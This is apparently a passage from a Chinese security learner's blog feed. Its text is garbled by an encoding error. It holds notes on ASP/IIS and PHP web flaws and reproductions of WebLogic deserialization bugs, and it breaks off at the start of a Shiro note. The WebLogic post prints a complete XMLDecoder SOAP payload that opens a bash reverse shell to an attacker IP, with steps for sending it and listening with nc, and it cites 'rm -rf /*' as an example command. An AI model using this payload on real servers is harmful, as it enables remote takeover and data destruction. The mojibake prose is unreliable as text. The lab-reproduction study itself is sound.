    <content type="html"><![CDATA[<p>ASPå®‰å…¨</p><p>é‡åˆ°çš„æ¯”è¾ƒå°‘è¿™é‡Œå°±ä¸å»å¤ç°äº†ç›´æ¥å¹²çœ‹è¯¾ç¨‹äº†</p><p>window asp iis access(sqlsever)</p><p>ä¸­é—´ä»¶é—®é¢˜ æ•°æ®åº“é—®é¢˜ è¯­è¨€é—®é¢˜</p><p>aceess æ•°æ®åº“ ä¸€èˆ¬åç¼€å asp asa mdb(ä¸‹è½½)</p><p>mdbé»˜è®¤ä¸‹è½½</p><p>mdbæ–‡ä»¶åœ¨ç½‘ç«™ç›®å½•ä¸‹</p><p>æ€è·¯ï¼šçŸ¥é“æ•°æ®åº“åœ°å€å°±å¯ä»¥å°è¯•ä¸‹è½½è·å–æ•°æ®åº“æ–‡ä»¶ è·å–å½“å‰ç®¡ç†å‘˜è´¦å·ä¿¡æ¯</p><p>å§n</p><p>aspåé—¨ä¸Šä¼ </p><p>ASPçš„æ•°æ®åº“æ–‡ä»¶é™¤äº†å¯ä»¥ä»¥mdbç»“å°¾ï¼Œä¹Ÿèƒ½ä»¥aspç»“å°¾ï¼Œç”±äºmdbæ–‡ä»¶èƒ½ä¸‹è½½è€Œaspæ–‡ä»¶ä¼šè¢«æ‰§è¡Œï¼Œå› æ­¤å½“æˆ‘ä»¬è®¿é—®ä»¥aspç»“å°¾çš„æ•°æ®åº“æ–‡ä»¶æ—¶åªèƒ½çœ‹åˆ°ä¹±ç æ•°æ®è€Œä¸ä¼šè‡ªåŠ¨ä¸‹è½½ï¼Œä½†ä¾æ—§å¯ä»¥å°†ä¹±ç å†…å®¹å¤åˆ¶åˆ°è®°äº‹æœ¬ä¸­ï¼Œå†å°†æ–‡ä»¶åç¼€ä¿®æ”¹æˆmdbï¼Œå³å¯çœ‹åˆ°æ­£å¸¸å†…å®¹ã€‚</p><p>åé—¨æ¤å…¥ASPçš„åŸç†æ˜¯å½“ç½‘ç«™å­˜åœ¨ç”¨æˆ·è¾“å…¥æ•°æ®å¹¶è¢«ä¿å­˜åœ¨æ•°æ®åº“ä¸­æ—¶ï¼ˆä¾‹å¦‚ç•™è¨€ä¿¡æ¯ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥ç²¾å¿ƒç¼–å†™çš„ASPæ‰§è¡Œè¯­å¥ï¼ˆç±»ä¼¼ä¸€å¥è¯æœ¨é©¬ï¼Œä½†çœ‹èµ·æ¥æ˜¯ä¹±ç çš„ï¼‰ï¼Œç„¶åæœåŠ¡å™¨å°†å…¶å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬å†è®¿é—®è¿™ä¸ªaspæ•°æ®åº“æ–‡ä»¶ï¼Œç”±äºæœåŠ¡å™¨ä¼šæŠŠè¿™ä¸ªæ–‡ä»¶å½“æˆASPè§£é‡Šæ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬çš„æ‰§è¡Œè¯­å¥ä¹Ÿä¼šè¢«æ‰§è¡Œï¼Œè¿™ä¸ªæ—¶å€™å†ç”¨èœåˆ€ç­‰è¿æ¥å·¥å…·å³å¯æ‹¿ä¸‹æœåŠ¡å™¨ã€‚<br> IIS ä¸­é—´ä»¶è§£ææ¼æ´</p><p>ç¬¬ä¸€ä¸ªå°±æ˜¯æ–‡ä»¶å¤¹æœ‰aspåç¼€ é‡Œé¢çš„æ–‡ä»¶å…¨éƒ½æŒ‰ç…§aspè¿›è¡Œè§£æ</p><p>è¿˜æœ‰ä¸€ç§è§£ææ¼æ´å‘½å</p><p>IIS PUTä¸Šä¼ æ¼æ´ï¼ŒæœåŠ¡å™¨å¼€å¯å†™å…¥åŠŸèƒ½æ‰ä¼šæœ‰è¿™ä¸ªæ¼æ´ï¼Œä¸è¿‡æ¯”è¾ƒå°‘è§</p><p>php å’Œjava æ²¡è®°å½•äº† </p><p>ç›´æ¥è®°å½•python</p><p>ssti </p><p>æ¨¡æ¿ ç›¸å½“äºæ‰‹æœºä¸»é¢˜å·®ä¸éƒ½æ„æ€</p><p>å­—èŠ‚ç æ–‡ä»¶ï¼ˆbytecodeï¼‰ï¼Œpycæ–‡ä»¶ç»è¿‡pythonè§£é‡Šå™¨<br>æœ€ç»ˆä¼šç”Ÿæˆæœºå™¨ç è¿è¡Œã€‚å› æ­¤pycæ–‡ä»¶æ˜¯å¯ä»¥è·¨å¹³å°éƒ¨ç½²çš„ï¼Œç±»ä¼¼Javaçš„.classæ–‡ä»¶ï¼Œ<br>èˆ¬pyæ–‡ä»¶æ”¹å˜åï¼Œéƒ½ä¼šé‡æ–°ç”Ÿæˆpycæ–‡ä»¶ã€‚</p><p> é‚£ä¹ˆå°±å¯ä»¥åç¼–è¯‘è·å¾—æºç æ–‡ä»¶</p><pre><code>1ã€ä»€ä¹ˆæ˜¯sSTIï¼Ÿæœ‰ä»€ä¹ˆæ¼æ´å±å®³ï¼Ÿ</code></pre><p>æ¼æ´æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸ºWeåº”ç”¨æ¨¡<br>æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡<br>æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShe11ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»<br>è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ASPå®‰å…¨&lt;/p&gt;
&lt;p&gt;é‡åˆ°çš„æ¯”è¾ƒå°‘è¿™é‡Œå°±ä¸å»å¤ç°äº†ç›´æ¥å¹²çœ‹è¯¾ç¨‹äº†&lt;/p&gt;
&lt;p&gt;window asp iis access(sqlsever)&lt;/p&gt;
&lt;p&gt;ä¸­é—´ä»¶é—®é¢˜ æ•°æ®åº“é—®é¢˜ è¯­è¨€é—®é¢˜&lt;/p&gt;
&lt;p&gt;aceess æ•°æ®åº“ ä¸€èˆ¬åç¼€å asp asa mdb(ä¸‹è½½)</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>è·Ÿç€å°è¿ªçš„ç¬¬ä¸‰å¤©</title>
    <link href="https://gu0f3n.github.io/2025/03/08/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/03/08/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/</id>
    <published>2025-03-08T01:42:12.000Z</published>
    <updated>2025-03-20T10:30:17.104Z</updated>
    
    <content type="html"><![CDATA[<p>phpå¼€å‘</p><p>è¿™ä¸ªè¯¾å¬ç€æ— èŠ</p><?phpmysql_connect()//æ•°æ®åº“è¿æ¥mysal_select_db()//é€‰æ‹©åº“?><p>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</p><p>æ˜¯è‡ªå·±å†™çš„è¿˜æ˜¯åº”ç”¨çš„åˆ«äººçš„æ¡†æ¶</p><p>æ–‡ä»¶ä¸‹è½½</p><p>ç›´æ¥ä¸‹è½½ å’Œä¼ å‚ä¸‹è½½</p><p>æ–‡ä»¶åˆ é™¤iåŸºæœ¬ä¸Šç¢°ä¸åˆ°äº†</p><p>æ–‡ä»¶å†™å…¥</p><p>webæ¼æ´æ ¸å¿ƒ å¯æ§å˜é‡å’Œç‰¹å®šå‡½æ•°</p><p>è¾“å…¥è¾“å‡ºç±»å®‰å…¨é—®é¢˜</p><p>xssæ¼æ´</p><p>åå°„ï¼šå­˜å‚¨ï¼šdom</p><p>è¾“å…¥çš„å†…å®¹ç›´æ¥æ˜¾ç¤ºå‡ºæ¥</p><p> å¯¼è‡´å‰ç«¯ç›´æ¥æ‰§è¡Œjsä»£ç </p><script>alert(1)</script><p>å…¨å±€å˜é‡$_SERVER</p><p>æ•°æ®åŒ…çš„æ‰€æœ‰è¯·æ±‚å¤´</p><p>csrfè·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ </p><p> åå°ç®¡ç†ç³»ç»Ÿæœ‰å¤šä¸ªæ–‡ä»¶é¡µé¢ï¼Œä¸ºäº†æ–¹ä¾¿éªŒè¯ï¼Œä¸€èˆ¬ä¼šé€‰ç”¨cookieæˆ–sessionè¿›è¡ŒéªŒè¯<br>cookieï¼šèº«ä»½éªŒè¯å­˜å‚¨åˆ°å®¢æˆ·ç«¯æµè§ˆå™¨å†…<br>sessionï¼šèº«ä»½éªŒè¯å­˜å‚¨åˆ°æœåŠ¡ç«¯æœåŠ¡å™¨å†…</p><p>æœªæˆæƒè®¿é—®</p><p>ç™»å½•åçš„é¡µé¢æ²¡æœ‰éªŒè¯æ˜¯å¦ç™»å½•æˆåŠŸ</p><p>éªŒè¯æ–¹å¼cookie,session</p><p>cookieï¼šèº«ä»½éªŒè¯å­˜å‚¨åˆ°å®¢æˆ·ç«¯æµè§ˆå™¨å†…<br>cookieå®‰å…¨ï¼šcookieä¿®æ”¹ä¼ªé€ ç›—å–<br>sessionï¼šèº«ä»½éªŒè¯å­˜å‚¨åˆ°æœåŠ¡ç«¯æœåŠ¡å™¨å†…<br>sessionå®‰å…¨ï¼šä¼šè¯åŠ«æŒï¼ˆsessionåŠ«æŒï¼‰</p><p>éªŒè¯ç å¤ç”¨</p><p>å…ˆè¾“å…¥æ­£ç¡®å¯†ç ç„¶åæŠ“åŒ…ä¿å­˜</p><p>è¿™ä¸ªéªŒè¯ç å¯ä»¥ä¸€ç›´ç”¨</p><p>jså‰ç«¯éªŒè¯ åœ¨æµè§ˆå™¨ä¸Šè¿›è¡Œçš„éªŒè¯ å¨èƒï¼šæµè§ˆå™¨å¯ä»¥åœ¨å‰ç«¯ç›´æ¥å¿½ç•¥</p><p>æ¡†æ¶</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;phpå¼€å‘&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªè¯¾å¬ç€æ— èŠ&lt;/p&gt;
&lt;?php

mysql_connect()//æ•°æ®åº“è¿æ¥

mysal_select_db()//é€‰æ‹©åº“

?&gt;

&lt;p&gt;æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½&lt;/p&gt;
&lt;p&gt;æ˜¯è‡ªå·±å†™çš„è¿˜æ˜¯åº”ç”¨çš„åˆ«äººçš„æ¡†æ¶&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶ä¸‹è½½&lt;/p&gt;
&lt;p&gt;ç›´</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>weblogicååºåˆ—åŒ–å¤ç°</title>
    <link href="https://gu0f3n.github.io/2025/03/07/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gu0f3n.github.io/2025/03/07/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-03-07T13:47:20.000Z</published>
    <updated>2025-03-20T10:13:17.970Z</updated>
    
    <content type="html"><![CDATA[<p>Oracle Fusion Middlewareï¼ˆOracleèåˆä¸­é—´ä»¶ï¼‰æ˜¯ç¾å›½ç”²éª¨æ–‡ï¼ˆOracleï¼‰å…¬å¸çš„ä¸€å¥—é¢å‘ä¼ä¸šå’Œäº‘ç¯å¢ƒçš„ä¸šåŠ¡åˆ›æ–°å¹³å°ã€‚è¯¥å¹³å°æä¾›äº†ä¸­é—´ä»¶ã€è½¯ä»¶é›†åˆç­‰åŠŸèƒ½ã€‚Oracle WebLogic Serveræ˜¯å…¶ä¸­çš„ä¸€ä¸ªé€‚ç”¨äºäº‘ç¯å¢ƒå’Œä¼ ç»Ÿç¯å¢ƒçš„åº”ç”¨æœåŠ¡å™¨ç»„ä»¶ã€‚</p><p>Oracle Fusion Middlewareä¸­çš„Oracle WebLogic Serverç»„ä»¶çš„WLS Securityå­ç»„ä»¶å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´æ§åˆ¶ç»„ä»¶ï¼Œå½±å“æ•°æ®çš„å¯ç”¨æ€§ã€ä¿å¯†æ€§å’Œå®Œæ•´æ€§ã€‚</p><h4 id="0x01-å½±å“ç‰ˆæœ¬"><a href="#0x01-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x01 å½±å“ç‰ˆæœ¬"></a>0x01 å½±å“ç‰ˆæœ¬</h4><p>Oracle WebLogic Server 10.3.6.0.0ç‰ˆæœ¬ï¼Œ12.1.3.0.0ç‰ˆæœ¬ï¼Œ12.2.1.1.0ç‰ˆæœ¬ï¼Œ12.2.1.2.0ç‰ˆæœ¬</p><p><strong>æ„é€ å¦‚ä¸‹Payloadï¼š</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/æ”»å‡»IP/1234 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ… è¯·æ±‚å¤´ä¸­æ·»åŠ ä»¥ä¸‹å­—æ®µï¼š</strong></p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">SOAPAction:</span></span><br><span class="line"><span class="section">Content-Type:text/xml</span></span><br></pre></td></tr></table></figure><p><strong>å†™å…¥å‡†å¤‡å¥½çš„payload POSTæ–¹å¼å‘é€å³å¯</strong></p><p>nc ç›‘å¬1234ç«¯å£åå¼¹shell</p><h1 id="Weblogicå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-2628ï¼‰"><a href="#Weblogicå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-2628ï¼‰" class="headerlink" title="Weblogicå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-2628ï¼‰"></a>Weblogicå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-2628ï¼‰</h1><h4 id="æ¼æ´å’‹äº§ç”Ÿçš„ï¼Ÿ"><a href="#æ¼æ´å’‹äº§ç”Ÿçš„ï¼Ÿ" class="headerlink" title=".æ¼æ´å’‹äº§ç”Ÿçš„ï¼Ÿ"></a><strong>.æ¼æ´å’‹äº§ç”Ÿçš„ï¼Ÿ</strong></h4><p>æ¼æ´çš„æ ¸å¿ƒæ˜¯<strong>WebLogicå¤„ç†T3åè®®æ•°æ®æ—¶çš„â€œæ— è„‘æ‹†åŒ…â€æœºåˆ¶</strong>ã€‚T3åè®®æ˜¯WebLogicé»˜è®¤å¼€å¯çš„é€šä¿¡åè®®ï¼Œç”¨äºæœåŠ¡å™¨å’ŒJavaç¨‹åºä¹‹é—´çš„æ•°æ®ä¼ è¾“ã€‚ä½†å®ƒåœ¨è§£ææ•°æ®æ—¶ï¼Œä¼šç›´æ¥å¯¹åºåˆ—åŒ–æ•°æ®ï¼ˆç±»ä¼¼æ‰“åŒ…çš„å¿«é€’ï¼‰è¿›è¡Œååºåˆ—åŒ–ï¼ˆæ‹†åŒ…ï¼‰ï¼Œè€Œ<strong>æ²¡æœ‰ä¸¥æ ¼æ£€æŸ¥åŒ…è£¹é‡Œæ˜¯å¦æœ‰å±é™©ç‰©å“</strong>ï¼ˆæ¶æ„ä»£ç ï¼‰</p><p><strong>T3åè®®é»˜è®¤å¼€æ”¾</strong>ï¼šWebLogicçš„7001ç«¯å£é»˜è®¤å¼€å¯T3æœåŠ¡ï¼Œç›¸å½“äºç»™é»‘å®¢ç•™äº†ä¸ªåé—¨</p><p><strong>ååºåˆ—åŒ–é»‘åå•ä¸å…¨</strong>ï¼šä¹‹å‰Oracleé€šè¿‡é»‘åå•æ‹¦æˆªå±é™©ç±»ï¼ˆæ¯”å¦‚<code>java.rmi.registry.Registry</code>ï¼‰ï¼Œä½†æ”»å‡»è€…æ¢äº†ä¸ªæ¥å£ï¼ˆå¦‚<code>java.rmi.activation.Activator</code>ï¼‰ï¼Œå°±ç»•è¿‡äº†æ£€æŸ¥</p><p><strong>ä¾èµ–å±é™©åº“</strong>ï¼šWebLogicä½¿ç”¨äº†å­˜åœ¨æ¼æ´çš„Apache Commons Collectionsåº“ï¼Œé»‘å®¢å¯é€šè¿‡è¿™ä¸ªåº“è§¦å‘ä»£ç æ‰§è¡Œ</p><h4 id="æ”»å‡»æ­¥éª¤æ‹†è§£"><a href="#æ”»å‡»æ­¥éª¤æ‹†è§£" class="headerlink" title="æ”»å‡»æ­¥éª¤æ‹†è§£"></a><strong>æ”»å‡»æ­¥éª¤æ‹†è§£</strong></h4><p><strong>åˆ†å››æ­¥èµ°</strong>ï¼š</p><ol><li><p><strong>ç¬¬ä¸€æ­¥ï¼šæ­â€œæŒ‡æŒ¥ä¸­å¿ƒâ€ï¼ˆJRMP Serverï¼‰</strong></p><ul><li>æ”»å‡»è€…åœ¨è‡ªå·±ç”µè„‘ä¸Šå¼€ä¸ª<strong>â€œæŒ‡æŒ¥ä¸­å¿ƒâ€</strong>ï¼ˆJRMPç›‘å¬æœåŠ¡ï¼‰ï¼Œç­‰ç€æœåŠ¡å™¨ä¸»åŠ¨è”ç³»ã€‚</li><li><em>ç›¸å½“äºé»‘å®¢å»ºäº†ä¸ªç§˜å¯†ç”µå°ï¼Œå‡†å¤‡å‘å·æ–½ä»¤ã€‚</em></li></ul></li><li><p><strong>ç¬¬äºŒæ­¥ï¼šä¼ªé€ â€œé€šè¡Œè¯â€ï¼ˆæ„é€ Payloadï¼‰</strong></p><ul><li><p>ç”¨å·¥å…·ç”Ÿæˆä¸€ä¸ª</p><p>â€œå‡é€šè¡Œè¯â€</p><p>ï¼ˆPayloadï¼‰ï¼Œé‡Œé¢å†™ç€ï¼š</p><ul><li><em>â€œæŒ‡æŒ¥ä¸­å¿ƒâ€åœ°å€ï¼ˆæ”»å‡»è€…IPå’Œç«¯å£ï¼‰ã€‚</em></li><li><em>â€œè§åˆ°æŒ‡æŒ¥ä¸­å¿ƒåï¼ŒæŒ‰å®ƒçš„æŒ‡ä»¤åŠäº‹ï¼â€</em></li></ul></li><li><p><em>è¿™ä¸ªé€šè¡Œè¯æœ¬è´¨æ˜¯ä¸€ä¸²ä¼ªè£…æˆæ­£å¸¸æ•°æ®çš„ä»£ç ï¼Œä½†æš—è—ç„æœºã€‚</em></p></li></ul></li><li><p><strong>ç¬¬ä¸‰æ­¥ï¼šå¿«é€’â€œç‚¸å¼¹â€ï¼ˆå‘é€Payloadï¼‰</strong></p><ul><li>é€šè¿‡WebLogicçš„<strong>T3å¿«é€’é€šé“</strong>ï¼ˆ7001ç«¯å£ï¼‰ï¼ŒæŠŠå‡é€šè¡Œè¯å¯„ç»™æœåŠ¡å™¨ã€‚</li><li><em>å› ä¸ºT3é€šé“é»˜è®¤å¼€æ”¾ä¸”å®‰æ£€ä¸ä¸¥ï¼ŒåŒ…è£¹é¡ºåˆ©é€è¾¾ã€‚</em></li></ul></li><li><p><strong>ç¬¬å››æ­¥ï¼šå¼•çˆ†â€œç‚¸å¼¹â€ï¼ˆè§¦å‘æ¼æ´ï¼‰</strong></p><ul><li>æœåŠ¡å™¨æ‹†å¼€åŒ…è£¹ï¼ˆååºåˆ—åŒ–Payloadï¼‰ï¼Œå‘ç°è¦è”ç³»â€œæŒ‡æŒ¥ä¸­å¿ƒâ€ã€‚</li><li>æœåŠ¡å™¨ä¸»åŠ¨è¿æ¥æ”»å‡»è€…çš„JRMPç›‘å¬æœåŠ¡ï¼Œ<strong>â€œæŒ‡æŒ¥ä¸­å¿ƒâ€ç«‹åˆ»ä¸‹å‘æœ€ç»ˆæŒ‡ä»¤</strong>ï¼ˆæ¯”å¦‚ï¼šâ€œæ‰§è¡Œå‘½ä»¤<code>rm -rf /*</code>åˆ åº“â€ï¼‰ã€‚</li><li><em>æ­¤æ—¶æœåŠ¡å™¨å®Œå…¨è¢«æ§åˆ¶ï¼Œæ”»å‡»è€…æƒ³å¹²å•¥å°±å¹²å•¥ã€‚</em></li></ul></li></ol><p><strong>T3åè®®</strong>ï¼šWebLogicçš„ä¸“å±å¿«é€’é€šé“ï¼Œé»˜è®¤å¼€æ”¾ä¸”æ•ˆç‡é«˜ï¼Œä½†å®‰æ£€ä¸ä¸¥</p><p><strong>RMIç»•è¿‡é»‘åå•</strong>ï¼šOracleç”¨é»‘åå•æ‹¦æˆªå·²çŸ¥å±é™©ç±»ï¼Œä½†æ”»å‡»è€…æ”¹ç”¨RMIåè®®çš„å…¶ä»–æ¥å£ï¼ˆå¦‚<code>Activator</code>ï¼‰ï¼Œæ¢æ±¤ä¸æ¢è¯ç»•è¿‡äº†æ£€æŸ¥</p><p><strong>ååºåˆ—åŒ–æ¼æ´</strong>ï¼šæœåŠ¡å™¨æ— è„‘æ‹†åŒ…è£¹ï¼ˆ<code>readObject</code>æ–¹æ³•ï¼‰ï¼ŒæŠŠæ¶æ„ä»£ç å½“æ­£å¸¸æŒ‡ä»¤æ‰§è¡Œ</p><p><strong>JRMPåè®®</strong>ï¼šæ”»å‡»è€…ç”¨JRMPç›‘å¬æœåŠ¡åšâ€œè¿œç¨‹æŒ‡æŒ¥â€ï¼Œè®©æœåŠ¡å™¨ä¸»åŠ¨è¿æ¥å¹¶æ¥æ”¶æ”»å‡»æŒ‡ä»¤</p><p>æ”»å‡»å°±æ˜¯åˆ©ç”¨CVE-2018-2628æ¼æ´å·¥å…·åŒ…(æ£€æµ‹å·¥å…·åœ¨å…¶ä¸­)</p><p>é¦–å…ˆæœ‰ä¸€ä¸ªç›‘æµ‹å·¥å…·éœ€è¦å°†txtæ–‡ä»¶æ”¹æˆç›®æ ‡åŠipæ£€æµ‹</p><p>æ£€æµ‹æˆåŠŸä¹‹å</p><p>åˆ©ç”¨ysoserialå»ç”Ÿæˆpayloadç„¶åå¯åŠ¨JRMPçš„ç›‘å¬</p><p>ç„¶ååˆ©ç”¨å·¥å…·ä¼ªé€ payload åå¼¹shellåˆ°æˆ‘çš„æ”»å‡»æœº</p><p>æŸ“çº¢é€šè¿‡T3é€šé“æŠŠpayloadä¼ é€’ç»™æœåŠ¡å™¨è¿›è¡Œååºåˆ—åŒ–è§£æè¿æ¥jRMPå»ºç«‹é€šè®¯</p><p>ç„¶åJRMPå‘é€åå¼¹shell çš„å‘½ä»¤ï¼Œæ‹¿ä¸‹æ”»å‡»æœº</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Oracle Fusion Middlewareï¼ˆOracleèåˆä¸­é—´ä»¶ï¼‰æ˜¯ç¾å›½ç”²éª¨æ–‡ï¼ˆOracleï¼‰å…¬å¸çš„ä¸€å¥—é¢å‘ä¼ä¸šå’Œäº‘ç¯å¢ƒçš„ä¸šåŠ¡åˆ›æ–°å¹³å°ã€‚è¯¥å¹³å°æä¾›äº†ä¸­é—´ä»¶ã€è½¯ä»¶é›†åˆç­‰åŠŸèƒ½ã€‚Oracle WebLogic Serveræ˜¯å…¶ä¸­çš„ä¸€ä¸ªé€‚ç”¨äºäº‘ç¯å¢ƒå’Œä¼ ç»Ÿç¯å¢ƒçš„åº”ç”¨æœåŠ¡å™¨ç»„ä»¶</summary>
      
    
    
    
    
    <category term="weblogic" scheme="https://gu0f3n.github.io/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>shiroååºåˆ—åŒ–æ¼æ´å¤ç°</title>
    <link href="https://gu0f3n.github.io/2025/03/07/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gu0f3n.github.io/2025/03/07/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-03-07T11:40:51.000Z</published>
    <updated>2025-03-20T10:13:17.967Z</updated>
    
    <content type="html"><![CDATA[<p>vulhubé¶åœºå¤ç°</p><p>æ¼æ´åŸç†</p><p>Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´ã€‚ é‚£ä¹ˆï¼ŒPayloadäº§ç”Ÿçš„è¿‡ç¨‹ï¼š å‘½ä»¤&#x3D;&gt;åºåˆ—åŒ–&#x3D;&gt;AESåŠ å¯†&#x3D;&gt;base64ç¼–ç &#x3D;&gt;RememberMe Cookieå€¼ åœ¨æ•´ä¸ªæ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯AESåŠ å¯†çš„å¯†é’¥ï¼Œå¦‚æœæ²¡æœ‰ä¿®æ”¹é»˜è®¤çš„å¯†é’¥é‚£ä¹ˆå°±å¾ˆå®¹æ˜“å°±çŸ¥é“å¯†é’¥äº†,Payloadæ„é€ èµ·æ¥ä¹Ÿæ˜¯ååˆ†çš„ç®€å•ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ <strong>Shiro RememberMe ååºåˆ—åŒ–æ¼æ´</strong>çš„è§¦å‘è·¯å¾„ã€‚ç”¨å¤§ç™½è¯è§£é‡Šå°±æ˜¯ï¼š</p><hr><h3 id="åœºæ™¯æ¯”å–»"><a href="#åœºæ™¯æ¯”å–»" class="headerlink" title="åœºæ™¯æ¯”å–»"></a><strong>åœºæ™¯æ¯”å–»</strong></h3><p>æƒ³è±¡ä½ è¿›äº†ä¸€å®¶é«˜çº§ä¼šæ‰€ï¼Œå‰å°ç»™ä½ ä¸€å¼ <strong>åŠ å¯†çš„ä¼šå‘˜å¡ï¼ˆRememberMe 